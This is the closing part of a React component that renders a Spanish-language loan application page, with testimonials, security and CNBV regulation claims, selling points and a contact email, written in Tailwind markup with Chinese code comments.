                        src="/images/testimonial-carlos.jpg" 
                        alt="Carlos Rodríguez - Cliente satisfecho"
                        className="w-12 h-12 rounded-full object-cover shadow-sm"
                      />
                      <div>
                        <h4 className="font-semibold text-slate-800 text-sm">Carlos Rodríguez</h4>
                        <div className="flex text-yellow-400 text-sm">
                          {'★'.repeat(5)}
                        </div>
                      </div>
                    </div>
                    <p className="text-sm text-slate-600 italic">
                      "Las tasas son realmente competitivas y no hay sorpresas. Todo está muy claro desde el inicio. 
                      Definitivamente recomiendo este servicio a cualquiera que necesite financiamiento."
                    </p>
                  </div>
                </div>
              </div>

              {/* Seguridad y regulación */}
              <div className="bg-gradient-to-r from-slate-50 to-slate-100 rounded-lg border border-slate-200 p-6">
                <h3 className="font-bold text-slate-800 text-lg mb-6 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
                  Máxima Seguridad y Regulación
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="text-center">
                    <img 
                      src="/images/security-encryption.jpg" 
                      alt="Encriptación de datos"
                      className="w-20 h-20 mx-auto rounded-lg object-cover shadow-md mb-4"
                    />
                    <h4 className="font-semibold text-slate-800 text-sm mb-2">Encriptación SSL</h4>
                    <p className="text-xs text-slate-600">Todos tus datos están protegidos con encriptación de nivel bancario SSL 256-bit.</p>
                  </div>
                  <div className="text-center">
                    <img 
                      src="/images/regulation-cnbv.jpg" 
                      alt="Regulación CNBV"
                      className="w-20 h-20 mx-auto rounded-lg object-cover shadow-md mb-4"
                    />
                    <h4 className="font-semibold text-slate-800 text-sm mb-2">CNBV Regulado</h4>
                    <p className="text-xs text-slate-600">Autorizados y supervisados por la Comisión Nacional Bancaria y de Valores.</p>
                  </div>
                  <div className="text-center">
                    <img 
                      src="/images/privacy-protection.jpg" 
                      alt="Protección de privacidad"
                      className="w-20 h-20 mx-auto rounded-lg object-cover shadow-md mb-4"
                    />
                    <h4 className="font-semibold text-slate-800 text-sm mb-2">Privacidad Total</h4>
                    <p className="text-xs text-slate-600">Cumplimos con todas las normativas de protección de datos personales.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* 右侧：信息面板 */}
          <div className="space-y-6">
            {/* 安全保障 */}
            <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
              <h3 className="font-bold text-slate-800 text-lg mb-4 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
                Garantías de Seguridad
              </h3>
              <div className="space-y-4">
                <div className="flex items-start space-x-3">
                  <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                    <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                    </svg>
                  </div>
                  <div>
                    <h4 className="font-semibold text-slate-800 text-sm">Encriptación SSL 256-bit</h4>
                    <p className="text-slate-600 text-xs mt-1">Datos protegidos con tecnología bancaria</p>
                  </div>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
                    <svg className="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                    </svg>
                  </div>
                  <div>
                    <h4 className="font-semibold text-slate-800 text-sm">Regulado por CNBV</h4>
                    <p className="text-slate-600 text-xs mt-1">Autorizado por autoridades financieras</p>
                  </div>
                </div>
                <div className="flex items-start space-x-3">
                  <div className="w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                    <svg className="w-4 h-4 text-amber-600" fill="currentColor" viewBox="0 0 20 20">
                      <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                  </div>
                  <div>
                    <h4 className="font-semibold text-slate-800 text-sm">Proceso Transparente</h4>
                    <p className="text-slate-600 text-xs mt-1">Sin costos ocultos ni sorpresas</p>
                  </div>
                </div>
              </div>
            </div>

            {/* 优势 */}
            <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
              <h3 className="font-bold text-slate-800 text-lg mb-4 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
                ¿Por qué elegirnos?
              </h3>
              <div className="space-y-3">
                <div className="flex items-center space-x-3">
                  <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                  <span className="text-slate-700 text-sm">Aprobación en minutos</span>
                </div>
                <div className="flex items-center space-x-3">
                  <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                  <span className="text-slate-700 text-sm">Tasas competitivas desde 12%</span>
                </div>
                <div className="flex items-center space-x-3">
                  <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                  <span className="text-slate-700 text-sm">Sin penalizaciones por pago anticipado</span>
                </div>
                <div className="flex items-center space-x-3">
                  <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                  <span className="text-slate-700 text-sm">Soporte especializado 24/7</span>
                </div>
              </div>
            </div>

            {/* 联系支持 */}
            <div className="bg-slate-50 border border-slate-200 rounded-lg p-6">
              <h3 className="font-semibold text-slate-800 text-base mb-2 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
                ¿Necesitas ayuda?
              </h3>
              <p className="text-slate-600 text-sm mb-4">
                Nuestro equipo está disponible para asistirte durante todo el proceso.
              </p>
              <div className="space-y-2 text-sm">
                <div className="flex items-center space-x-2 text-slate-700">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
                    <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
                  </svg>
                  <span>diliads01@outlook.com</span>
                </div>
              </div>
            </div>

            {/* 客户评价 */}
            <div className="bg-white rounded-lg shadow-lg border border-slate-200 p-6">
              <h3 className="font-bold text-slate-800 text-lg mb-4 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
                Lo que dicen nuestros clientes
              </h3>
              <div className="space-y-4">
                <div className="border-l-4 border-slate-800 pl-4">
                  <p className="text-sm text-slate-600 italic mb-2">
                    "Proceso muy rápido y transparente. Obtuve mi préstamo en menos de 24 horas."
                  </p>
                  <div className="flex items-center space-x-2">
                    <div className="flex text-yellow-400">
                      {'★'.repeat(5)}
                    </div>
                    <span className="text-xs text-slate-500">- María G.</span>
                  </div>
                </div>
                <div className="border-l-4 border-slate-800 pl-4">
                  <p className="text-sm text-slate-600 italic mb-2">
                    "Excelente atención al cliente y tasas muy competitivas."
                  </p>
                  <div className="flex items-center space-x-2">
                    <div className="flex text-yellow-400">
                      {'★'.repeat(5)}
                    </div>
                    <span className="text-xs text-slate-500">- Carlos R.</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoanWizardEnhanced;